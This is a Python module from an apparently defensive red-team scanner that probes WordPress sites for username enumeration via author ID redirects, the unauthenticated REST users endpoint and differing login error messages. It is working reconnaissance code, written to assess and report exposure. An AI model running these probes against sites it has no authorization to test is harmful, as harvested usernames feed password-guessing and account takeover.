"""WordPress user enumeration attacks — MEDIUM severity.

Tests user discovery vectors including author ID scanning with redirect
detection, REST API user listing, and login error message disclosure.
"""

import asyncio
import json
import re
import time
import logging

from redteam.base import Attack, AttackResult, Severity, Status

logger = logging.getLogger(__name__)


class UserEnumerationAttack(Attack):
    """Test user discovery vectors on WordPress sites."""

    name = "wordpress.user_enumeration"
    category = "wordpress"
    severity = Severity.MEDIUM
    description = "User enumeration via author archives, REST API, and login error disclosure"
    target_types = {"wordpress"}

    async def execute(self, client) -> list[AttackResult]:
        results = []

        results.append(await self._test_author_id_scan(client))
        results.append(await self._test_rest_users_unauthenticated(client))
        results.append(await self._test_login_error_disclosure(client))

        return results

    async def _test_author_id_scan(self, client) -> AttackResult:
        """GET /?author=1 through /?author=N — check for redirects to /author/{username}/."""
        start = time.monotonic()

        throttle = self._get_throttle("wordpress.user_enumeration")
        max_ids = throttle.get("max_author_ids", 10)
        delay_ms = throttle.get("delay_ms", 0)

        discovered_users = []

        try:
            for author_id in range(1, max_ids + 1):
                status, body, headers = await client.get(
                    "/", params={"author": str(author_id)}, cookies={}
                )

                username = None

                # Check for redirect to /author/{username}/
                if status in (301, 302, 303, 307, 308):
                    location = headers.get("Location", "")
                    match = re.search(r"/author/([^/]+)/?", location)
                    if match:
                        username = match.group(1)

                # Check response body for author archive patterns
                if not username and status == 200:
                    # Look for author name in body
                    body_match = re.search(
                        r'class="author[^"]*"[^>]*>([^<]+)<', body
                    )
                    if not body_match:
                        body_match = re.search(r"/author/([^/\"']+)", body)
                    if body_match:
                        username = body_match.group(1)

                if username:
                    discovered_users.append({
                        "id": author_id,
                        "username": username,
                    })

                if delay_ms > 0 and author_id < max_ids:
                    await asyncio.sleep(delay_ms / 1000.0)

            duration = (time.monotonic() - start) * 1000

            if discovered_users:
                usernames = [u["username"] for u in discovered_users]
                return self._make_result(
                    variant="author_id_scan",
                    status=Status.VULNERABLE,
                    severity=Severity.MEDIUM,
                    evidence=f"Discovered {len(discovered_users)} users via author ID scan: {usernames}",
                    details=(
                        f"Scanned author IDs 1-{max_ids}. Found {len(discovered_users)} users: "
                        f"{', '.join(f'ID {u['id']}={u['username']}' for u in discovered_users)}. "
                        f"Author archives expose usernames which enable targeted brute-force attacks."
                    ),
                    request={"method": "GET", "path": "/?author=1..{max_ids}", "max_ids": max_ids},
                    response={"users": discovered_users},
                    duration_ms=duration,
                )

            return self._make_result(
                variant="author_id_scan",
                status=Status.DEFENDED,
                evidence=f"Scanned IDs 1-{max_ids}, no usernames discovered",
                details=(
                    f"Author ID scan of 1-{max_ids} did not reveal any usernames. "
                    f"Author archives are disabled or redirects are suppressed."
                ),
                request={"method": "GET", "path": "/?author=1..{max_ids}", "max_ids": max_ids},
                response={},
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="author_id_scan",
                status=Status.ERROR,
                details=f"Error during author ID scan: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_rest_users_unauthenticated(self, client) -> AttackResult:
        """GET /wp-json/wp/v2/users without auth — check for user list exposure."""
        start = time.monotonic()
        try:
            status, body, headers = await client.rest_get(
                "/wp/v2/users", authenticated=False
            )
            duration = (time.monotonic() - start) * 1000

            users = []
            try:
                data = json.loads(body)
                if isinstance(data, list):
                    users = data
            except (json.JSONDecodeError, AttributeError):
                pass

            if status == 200 and users:
                user_info = []
                for u in users[:10]:
                    info = {"slug": u.get("slug", "?")}
                    if "name" in u:
                        info["name"] = u["name"]
                    if "id" in u:
                        info["id"] = u["id"]
                    user_info.append(info)

                slugs = [u["slug"] for u in user_info]
                return self._make_result(
                    variant="rest_users_unauthenticated",
                    status=Status.VULNERABLE,
                    severity=Severity.MEDIUM,
                    evidence=f"REST API returned {len(users)} users: {slugs}",
                    details=(
                        f"GET /wp-json/wp/v2/users without auth returned {len(users)} users. "
                        f"Slugs: {', '.join(slugs)}. "
                        f"Usernames from the REST API enable targeted password attacks."
                    ),
                    request={"method": "GET", "path": "/wp-json/wp/v2/users", "authenticated": False},
                    response={"status": status, "users": user_info},
                    duration_ms=duration,
                )

            return self._make_result(
                variant="rest_users_unauthenticated",
                status=Status.DEFENDED,
                evidence=f"HTTP {status}, no user data returned",
                details=f"REST users endpoint returned HTTP {status} — user listing restricted.",
                request={"method": "GET", "path": "/wp-json/wp/v2/users", "authenticated": False},
                response={"status": status},
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="rest_users_unauthenticated",
                status=Status.ERROR,
                details=f"Error testing REST users: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_login_error_disclosure(self, client) -> AttackResult:
        """POST to wp-login.php — check if error messages disclose valid usernames.

        WordPress default behavior:
        - Invalid username: "Unknown username. Check again or try your email address."
        - Valid username, wrong password: "The password you entered for the username X is incorrect."

        This difference allows attackers to confirm which usernames exist.
        """
        start = time.monotonic()
        findings = []

        try:
            # Test 1: Definitely-invalid username
            fake_user = "definitely_not_a_real_user_xyz"
            status_fake, body_fake, _ = await client.post_form(
                client.login_path,
                data={
                    "log": fake_user,
                    "pwd": "wrongpassword123",
                    "wp-submit": "Log In",
                    "testcookie": "1",
                },
                authenticated=False,
            )

            # Look for username-specific error messages
            invalid_user_indicators = [
                "invalid username",
                "unknown username",
                "not registered",
                "is not registered on this site",
            ]
            fake_has_specific_error = any(
                ind in body_fake.lower() for ind in invalid_user_indicators
            )
            if fake_has_specific_error:
                findings.append(
                    f"Invalid username '{fake_user}' produced specific error "
                    f"(differentiable from valid user with wrong password)"
                )

            # Test 2: Try "admin" (commonly exists)
            status_admin, body_admin, _ = await client.post_form(
                client.login_path,
                data={
                    "log": "admin",
                    "pwd": "wrongpassword123",
                    "wp-submit": "Log In",
                    "testcookie": "1",
                },
                authenticated=False,
            )

            password_wrong_indicators = [
                "password you entered",
                "incorrect password",
                "is incorrect",
                "wrong password",
            ]
            admin_has_password_error = any(
                ind in body_admin.lower() for ind in password_wrong_indicators
            )
            if admin_has_password_error:
                findings.append(
                    "Login with 'admin' + wrong password produced password-specific error, "
                    "confirming 'admin' exists"
                )

            # Compare: if the errors are different, enumeration is possible
            errors_differ = body_fake != body_admin and (
                fake_has_specific_error or admin_has_password_error
            )
            if errors_differ:
                findings.append(
                    "Error messages differ between invalid username and valid username "
                    "with wrong password — enables username enumeration"
                )

            duration = (time.monotonic() - start) * 1000

            if findings:
                return self._make_result(
                    variant="login_error_disclosure",
                    status=Status.VULNERABLE,
                    severity=Severity.MEDIUM,
                    evidence=f"Login error disclosure: {findings}",
                    details=(
                        f"WordPress login form discloses whether a username exists. "
                        f"Findings: {'; '.join(findings)}. "
                        f"This enables attackers to build a valid username list before "
                        f"launching password attacks."
                    ),
                    request={"method": "POST", "path": client.login_path, "test_users": [fake_user, "admin"]},
                    response={
                        "fake_user_status": status_fake,
                        "fake_user_body": body_fake[:300],
                        "admin_status": status_admin,
                        "admin_body": body_admin[:300],
                    },
                    duration_ms=duration,
                )

            return self._make_result(
                variant="login_error_disclosure",
                status=Status.DEFENDED,
                evidence="Login errors are generic — no username disclosure",
                details=(
                    f"Login form returned generic error messages for both invalid and "
                    f"potentially-valid usernames. No enumeration possible via error text."
                ),
                request={"method": "POST", "path": client.login_path},
                response={
                    "fake_user_status": status_fake,
                    "admin_status": status_admin,
                },
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="login_error_disclosure",
                status=Status.ERROR,
                details=f"Error testing login error disclosure: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )
